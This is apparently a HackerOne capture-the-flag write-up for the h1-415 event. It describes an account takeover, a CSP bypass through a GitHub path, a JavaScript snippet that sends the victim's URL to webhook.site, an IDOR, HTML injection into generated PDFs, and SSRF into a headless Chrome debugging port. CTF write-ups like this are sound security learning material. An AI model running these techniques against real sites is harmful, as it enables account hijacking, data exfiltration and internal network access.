  "vulnerability_information": "## Summary:\n[add summary of the vulnerability]\nAccount takeover was possible because of the email validation used - `jobert@mydocz.cosmic<>{}` could be registered, but when the the system created the recovery `QR` code the extra symbols would get stripped leaving us with a valid recovery `QR` code to log into `jobert@mydocz.cosmic`. Once logged in we had access to the `support` bot (if you left a `1` star review, \"someone\" would come by and check our conversation) - here we realized we could inject markup however the CSP policy was pretty strict, the only outside script allowed to run needed to come from `https://github.com/mattboldt/typed.js/master/lib/` we found that we could append a github repo to this url and execute it's content `https://github.com/mattboldt/typed.js/master/lib/@https://github.com/username/repo_name/master/filename.js` you have to remove `/blob/` from the repo url.  Once we had execution we tried to exfiltrate `cookies` and anything we could think of, include `window.location.href` which gives you the current url the user is visiting, we did is using a script that looked like\n```js\nvar image = document.createElement(\"img\")\nvar image.src = \"webhook.site/1234/img.png?url= + window.location.href\ndocument.body.appendChild(image)\n``` \nThis allowed us to get the reviewer link to our conversation: `https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd` \nOnce you had access to the form in the reviews there's a form the reviewer has access to, to edit the user's name, this parameter was vulnerable to an IDOR - so you could edit anyone's name, we created a second trial account and tried to change its name - it worked, next we noticed the pdf's the application was creating rendered the name of the user - with this information we tried to inject html into the name using the IDOR we found and it worked! html is rendering, let's make a request to our server so we can get more information about what's creating these pdfs, here I used https://ssrftest.com to test for SSRF - there's a payload to use an image and try to get a request back to the server - it works and the header's that are important to us here are `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36` it tells us this is a headless browser Chrome running on linux, there's also a `Referer: http://localhost:3000/` so we know this is running behind a proxy - we spent a lot of time trying to figure out how to do the next thing - finally we started using an `iframe` to \"peek\" inside the application, trying ports, `80` returned `FORBIDDEN` and everything else we tried was blank, and then I remembered this was using `headless Chrome` so I used my google-fu and searched for `headless chrome port number` and the results were promising: \n```\nchrome \\\n  --headless \\                   # Runs Chrome in headless mode.\n  --disable-gpu \\                # Temporarily needed if running on Windows.\n  --remote-debugging-port=9222 \\\n  https://www.chromestatus.com   # URL to open. Defaults to about:blank.\n```\n\nWe used that port number like so: `<iframe src='http://localhost:9222 width=900 height=900></iframe>` this gave us back: \n\n`Inspectable WebContents`  :( \n\nbut then we tried: `<iframe src='http://localhost:9222/json width=900 height=900></iframe>` and....\n\nwe receive a json document with the important part being\n```\nsecret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\",   \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/E20087FA03CA27A6E908AFD7E5321E88\"```\n\nif you access: https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\n\nIt is done! \n\nThank you Hacker1 for hosting this event, I participated with 2 other awesome friends from the hacker101 discord @checkm50 & @ Al-MadjusT who without I would not have been able to finish it - we did it and took us every moment of it, but we did it. And it feels awesome! \n\nThis write up is last minute and it sucks, next time I'll write a better one, this one was all about getting it done.\n\nAgain thank you!\n\n## Impact\n\nWe finished it.\n\nWe got to take over an account and compromise the internal network to retrieve the secret document.",
